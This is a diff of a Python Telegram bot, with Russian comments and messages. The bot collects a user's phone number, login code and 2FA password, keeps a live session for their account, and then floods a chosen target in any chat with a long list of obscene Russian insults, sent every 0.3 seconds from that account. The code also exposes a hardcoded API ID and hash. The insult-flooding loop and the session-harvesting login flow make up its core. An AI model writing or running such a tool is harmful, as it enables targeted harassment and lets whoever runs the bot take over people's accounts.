@@ -6,7 +6,6 @@ from telethon import TelegramClient, events
 from telethon.errors import FloodWaitError, SessionPasswordNeededError
 from telethon.tl.custom import Button
 
-# ========== КОНФИГ ==========
 API_ID = 39163151
 API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
 BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
@@ -15,7 +14,7 @@ SESSION_DIR = "sessions"
 if not os.path.exists(SESSION_DIR):
     os.makedirs(SESSION_DIR)
 
-# ========== ЗАГЛУШКА ДЛЯ RENDER ==========
+# Заглушка для Render
 class SimpleHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -31,20 +30,17 @@ def run_webserver():
 
 Thread(target=run_webserver, daemon=True).start()
 
-# ========== КЛИЕНТ БОТА ==========
+# Бот
 bot_client = TelegramClient(
     os.path.join(SESSION_DIR, 'bot_session'),
     API_ID,
     API_HASH
 ).start(bot_token=BOT_TOKEN)
 
-# ========== ХРАНИЛИЩА ==========
-# Здесь хранятся авторизованные пользователи (их сессии)
-user_clients = {}      # user_id -> TelegramClient (ЕГО аккаунт)
-user_auth_data = {}    # user_id -> временные данные для авторизации
-active_attacks = {}    # активные атаки
+user_clients = {}
+user_auth_data = {}
+active_attacks = {}
 
-# ========== КЛАВИАТУРЫ ==========
 def get_digit_keyboard():
     return [
         [Button.inline("1"), Button.inline("2"), Button.inline("3")],
@@ -56,7 +52,7 @@ def get_digit_keyboard():
 def get_clear_keyboard():
     return Button.clear()
 
-# ========== ВСЕ СЛОВА ДЛЯ АТАКИ ==========
+# ========== ВСЕ СЛОВА ДЛЯ ТРОЛЛИНГА ==========
 lines_list = [
 "я твою мать ебал",
 "я твою мать ебал в жопу",
@@ -256,7 +252,7 @@ lines_list = [
 "потому что ты никто и звать тебя никак"
 ]
 
-# ========== АТАКА ОТ ЛИЦА ПОЛЬЗОВАТЕЛЯ ==========
+# ========== АТАКА ==========
 async def attack_loop(user_id, target, chat_id, stop_event):
     user_client = user_clients.get(user_id)
     if not user_client:
@@ -274,31 +270,30 @@ async def attack_loop(user_id, target, chat_id, stop_event):
                 pass
         await asyncio.sleep(0.3)
 
-# ========== ОБРАБОТЧИК СООБЩЕНИЙ ==========
+# ========== АВТОРИЗАЦИЯ (ТОЛЬКО ЛС) ==========
 @bot_client.on(events.NewMessage)
-async def handle(event):
+async def handle_auth(event):
     user_id = event.sender_id
     text = event.raw_text.strip()
     chat_id = event.chat_id
 
-    # /start только в личке с ботом
-    if text == '/start' and chat_id == user_id:
-        if user_id in user_clients:
-            await event.reply("✅ Твой аккаунт уже авторизован!\n\n.байт @username\n.байтстоп @username")
-            return
-        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
-        await event.reply("🔐 Нажми кнопку, чтобы авторизовать ТВОЙ аккаунт", buttons=buttons)
+    if chat_id != user_id:
         return
 
-    # Получение номера (только в личке с ботом)
-    if event.contact and chat_id == user_id:
+    if text == '/start':
+        if user_id in user_clients:
+            await event.reply("✅ Аккаунт авторизован. Теперь пиши .байт @username в любом чате")
+            return
+        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
+        await event.reply("🔐 Отправь номер", buttons=buttons)
+        return
+
+    if event.contact:
         phone = event.contact.phone_number
         if not phone:
-            await event.reply("❌ Ошибка")
             return
         if user_id in user_auth_data:
             return
-        
         session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
         user_client = TelegramClient(session_path, API_ID, API_HASH)
         await user_client.connect()
@@ -311,50 +306,57 @@ async def handle(event):
                 'state': 'code_waiting',
                 'temp_input': ''
             }
-            await event.reply(f"✅ Код отправлен на {phone[-4:]}\n\nВведи код кнопками:", buttons=get_digit_keyboard())
+            await event.reply(f"✅ Код на {phone[-4:]}\n\nВведи код кнопками:", buttons=get_digit_keyboard())
         except Exception as e:
             await event.reply(f"❌ {e}")
         return
 
-    # Команды в ЛЮБОМ чате (если авторизован)
-    if user_id in user_clients:
-        if text.startswith('.байт '):
-            parts = text.split()
-            if len(parts) < 2:
-                return
-            target = parts[1].replace('@', '')
-            key = f"{user_id}_{target}_{chat_id}"
-            if key in active_attacks:
-                return
+# ========== КОМАНДЫ В ЛЮБОМ ЧАТЕ ==========
+@bot_client.on(events.NewMessage)
+async def handle_commands(event):
+    user_id = event.sender_id
+    text = event.raw_text.strip()
+    chat_id = event.chat_id
+
+    if chat_id == user_id:
+        return
+    if user_id not in user_clients:
+        return
+
+    if text.startswith('.байт '):
+        parts = text.split()
+        if len(parts) < 2:
+            return
+        target = parts[1].replace('@', '')
+        key = f"{user_id}_{target}_{chat_id}"
+        if key not in active_attacks:
             stop = asyncio.Event()
             task = asyncio.create_task(attack_loop(user_id, target, chat_id, stop))
-            active_attacks[key] = {'task': task, 'stop': stop}
+            active_attacks[key] = (task, stop)
+        return
+    
+    if text.startswith('.байтстоп '):
+        parts = text.split()
+        if len(parts) < 2:
             return
-        
-        if text.startswith('.байтстоп '):
-            parts = text.split()
-            if len(parts) < 2:
-                return
-            target = parts[1].replace('@', '')
-            key = f"{user_id}_{target}_{chat_id}"
-            if key in active_attacks:
-                active_attacks[key]['stop'].set()
-                active_attacks[key]['task'].cancel()
-                del active_attacks[key]
-            return
+        target = parts[1].replace('@', '')
+        key = f"{user_id}_{target}_{chat_id}"
+        if key in active_attacks:
+            task, stop = active_attacks[key]
+            stop.set()
+            task.cancel()
+            del active_attacks[key]
+        return
 
-# ========== INLINE КНОПКИ ДЛЯ КОДА ==========
+# ========== INLINE КНОПКИ ==========
 @bot_client.on(events.CallbackQuery)
 async def callback(event):
     user_id = event.sender_id
     data = event.data.decode('utf-8')
-    
     if user_id not in user_auth_data:
         await event.answer("Нажми /start", alert=True)
         return
-    
     auth = user_auth_data[user_id]
-    
     if auth['state'] == 'code_waiting':
         if data == '✅':
             code = auth.get('temp_input', '')
@@ -369,26 +371,14 @@ async def callback(event):
                 )
                 user_clients[user_id] = auth['client']
                 del user_auth_data[user_id]
-                await event.edit("✅ Твой аккаунт авторизован!\n\n.байт @username\n.байтстоп @username", buttons=get_clear_keyboard())
+                await event.edit("✅ Аккаунт авторизован!\n\n.байт @username в любом чате", buttons=get_clear_keyboard())
             except SessionPasswordNeededError:
                 auth['state'] = 'password_waiting'
                 auth['temp_input'] = ''
-                await event.edit("🔐 Введи 2FA пароль:", buttons=get_digit_keyboard())
+                await event.edit("🔐 2FA пароль:", buttons=get_digit_keyboard())
             except Exception as e:
-                err = str(e).lower()
-                if 'expired' in err:
-                    await event.answer("Код устарел, новый отправлен", alert=True)
-                    try:
-                        new = await auth['client'].send_code_request(auth['phone'])
-                        auth['phone_code_hash'] = new.phone_code_hash
-                        auth['temp_input'] = ''
-                        await event.edit("✅ Новый код отправлен. Введи:", buttons=get_digit_keyboard())
-                    except:
-                        await event.edit("❌ Ошибка, начни с /start", buttons=get_clear_keyboard())
-                        del user_auth_data[user_id]
-                else:
-                    await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
-                    del user_auth_data[user_id]
+                await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
+                del user_auth_data[user_id]
         elif data == '◀️':
             auth['temp_input'] = auth.get('temp_input', '')[:-1]
             display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
@@ -397,7 +387,6 @@ async def callback(event):
             auth['temp_input'] = auth.get('temp_input', '') + data
             display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
             await event.edit(display, buttons=get_digit_keyboard())
-    
     elif auth['state'] == 'password_waiting':
         if data == '✅':
             pwd = auth.get('temp_input', '')
@@ -408,18 +397,18 @@ async def callback(event):
                 await auth['client'].sign_in(password=pwd)
                 user_clients[user_id] = auth['client']
                 del user_auth_data[user_id]
-                await event.edit("✅ Твой аккаунт авторизован!\n\n.байт @username\n.байтстоп @username", buttons=get_clear_keyboard())
+                await event.edit("✅ Аккаунт авторизован!\n\n.байт @username в любом чате", buttons=get_clear_keyboard())
             except Exception:
                 await event.answer("Неверный пароль", alert=True)
                 auth['temp_input'] = ''
                 await event.edit("🔐 Неверный пароль, попробуй снова:", buttons=get_digit_keyboard())
         elif data == '◀️':
             auth['temp_input'] = auth.get('temp_input', '')[:-1]
-            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA пароль:"
+            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
             await event.edit(display, buttons=get_digit_keyboard())
         elif data.isdigit():
             auth['temp_input'] = auth.get('temp_input', '') + data
-            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA пароль:"
+            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
             await event.edit(display, buttons=get_digit_keyboard())
 
 # ========== ЗАПУСК ==========
@@ -427,8 +416,9 @@ async def main():
     await bot_client.start()
     me = await bot_client.get_me()
     print(f'✅ Бот: @{me.username}')
-    print('Пользователь авторизуется через /start')
-    print('После авторизации .байт @username в ЛЮБОМ чате')
+    print('\n👉 Напиши боту /start, авторизуй свой аккаунт')
+    print('👉 После авторизации пиши .байт @username в ЛЮБОМ чате')
+    print('👉 Атака идёт от твоего лица\n')
     await bot_client.run_until_disconnected()
 
 with bot_client:
